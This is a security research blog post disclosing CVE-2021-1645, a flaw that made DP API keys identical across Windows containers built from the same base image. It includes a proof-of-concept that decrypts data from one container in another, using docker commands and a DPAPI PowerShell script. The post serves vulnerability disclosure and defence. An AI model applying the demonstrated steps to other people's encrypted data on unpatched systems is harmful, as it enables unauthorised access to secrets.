---
layout: post
title: "DP API Encryption Ineffective in Windows Containers"
image: '2021-03-23_02-bg'
date: 2021-03-23 08:00:01 +0000
author: Marc Nimmerrichter
summary: "We discovered that DP API encryption in Windows containers is not secure"
description:
---

We recently discovered a vulnerability in the key management of Windows containers. Windows containers used publicly available cryptographic keys when encrypting with the Windows Data Protection API (DP API). Furthermore, keys used in different containers by different organizations were the same. This vulnerability allowed attackers to decrypt any data that was encrypted with DP API keys in Windows containers. The vulnerability was confirmed by Microsoft and assigned [CVE-2021-1645](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645).

In this blog post we describe CVE-2021-1645. This vulnerability was discovered in close cooperation with Marc Nimmerrichter from [Certitude Consulting GmbH](https://certitude.consulting/en). To understand the vulnerability, one has to have a basic understanding of DP API.

## DP API

The DP API allows applications to encrypt arbitrary data. An application does not have to manage keys. Instead, any data can be passed to the API, which then returns an encrypted blob. Similarly, an application can pass a previously encrypted blob to retrieve the plain text. The key used for these encryption operations is either tied to the user context or is unique to a machine (please refer to [[1]](#1) or [[2]](#2) for more details).

## CVE-2021-1645 and its Impact

CVE-2021-1645 applies to both, user and machine key DP API encryption within Windows Docker containers. In our explanation and PoC we will use machine key encryption, but the same issue exists if data is encrypted with the user key.

Normally, a machine key is tied to a (virtual-)machine. Therefore, if an application on machine A encrypted data, it would not be possible to decrypt the data on machine B. When designing the Windows containers feature Microsoft did not sufficiently consider this security behavior. Upon researching DP API in containers we discovered that DP API machine keys were identical for all Windows containers with the same base image. This was due to the fact that DP API machine keys of containers came from the base image. As the base images are public, the DP API machine keys were public too! Therefore, any DP API encryption using the machine key in any Windows containers was worthless.

Organizations that used DP API keys in Windows Docker containers to store encrypted data in a potentially insecure location, should consider this data to be compromised.

## Proof of Concept

In the following of this section we demonstrate that any data encrypted by the DP API machine key of a container application can be decrypted in any other container with the same base image. The following test setup utilizes two virtual machines (VM1, VM2) generated from the Azure VM template “Windows Server 2019 Datacenter with Containers- Gen2”. Microsoft already patched the base images in their Dockerhub repository. To reproduce this scenario, old image versions are required.

First, start a docker container called _Alice_ on _VM1_:

~~~powershell
docker run --name Alice -it mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019 cmd.exe
~~~

Then, encrypt a file in the _Alice_ container using the powershell script vault.ps1 [[3]](#3):

~~~powershell
C:>powershell.exe -File vault.ps1 -StoreSecret "This is my secret text" secret.txt
C:>type secret.txt
AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAm+1a2TNbiEahEIB4y/C3vQAAAAACAAAAAAAQZgAAAAEAACAAAAAdbJ9ZanY929j39ZLgabsaE5hRS4TLkCaaaRqb
+n3ZXAAAAAAOgAAAAAIAACAAAAC7fHbsKHCTaMhsWIVMYwUZezbLozItcqExHdg9EJcfDiAAAABFv2EHA5TTqb8I9I+BZrfQS5ViD93KZlL4FoYIBldGY0AA
AABdx7adlANRnw1shJTOtE6cYTAeqmb1yTe9adcSY1nBvtqlqSWQ/zwGaqfIfumuUm+o+ySwZXH/Su5GovJ8aUP9
~~~

Start a docker container _Bob_ on _VM2_:

~~~powershell
docker run --name Bob -it mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019 cmd.exe
~~~

The following command shows that the file can be decrypted in the _Bob_ container:

~~~powershell
C:>powershell.exe -File vault.ps1 secret.txt
This is my secret text
~~~

## Security Patch

Microsoft fixed CVE-2021-1645 with the Microsoft Patch Tuesday of January 2021. Affected users should apply both, OS updates and base-image updates, to address this issue.

Unfortunately, the patch comes with a caveat: The vulnerability appears to be due to a design problem. It could not be fixed in a straightforward way. After the patch Windows containers generate DP API keys when the container is first started. This means that all containers use different keys. There is currently no way to share keys between containers or transfer a key from one container to another. This is impractical as containers are often relatively short-lived. Moreover, when a container is scaled up, new containers will not be able to work with previously encrypted blobs.

As a result, the DP API is currently of limited use in containers.

<div class='sources' markdown='1'>
# Sources
* \[<span id='1'>1</span>\] [https://www.passcape.com/index.php?id=28&section=docsys&cmd=details](https://www.passcape.com/index.php?id=28&section=docsys&cmd=details)
* \[<span id='2'>2</span>\] [https://docs.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)?redirectedfrom=MSDN)
* \[<span id='3'>3</span>\] [https://blag.nullteilerfrei.de/2018/01/05/powershell-dpapi-script/](https://blag.nullteilerfrei.de/2018/01/05/powershell-dpapi-script/)
</div>

# Appendix

`Vault.ps1`

Script from [[3]](#3)

~~~powershell
Param(
  [string] $StoreSecret,
  [Parameter(Mandatory=$True,Position=0)]
  [string] $filename )
[void] [Reflection.Assembly]::LoadWithPartialName("System.Security")
$scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
if ($StoreSecret -eq "") {
  $data = Get-Content $filename
  $ciphertext = [System.Convert]::FromBase64String($data)
  $plaintext = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $ciphertext, $null, $scope )
  [System.Text.UTF8Encoding]::UTF8.GetString($plaintext)
} else {
  $plaintext = [System.Text.UTF8Encoding]::UTF8.GetBytes($StoreSecret)
  $ciphertext = [System.Security.Cryptography.ProtectedData]::Protect(
    $plaintext, $null, $scope ) 
  [System.Convert]::ToBase64String($ciphertext) > $filename
}
~~~
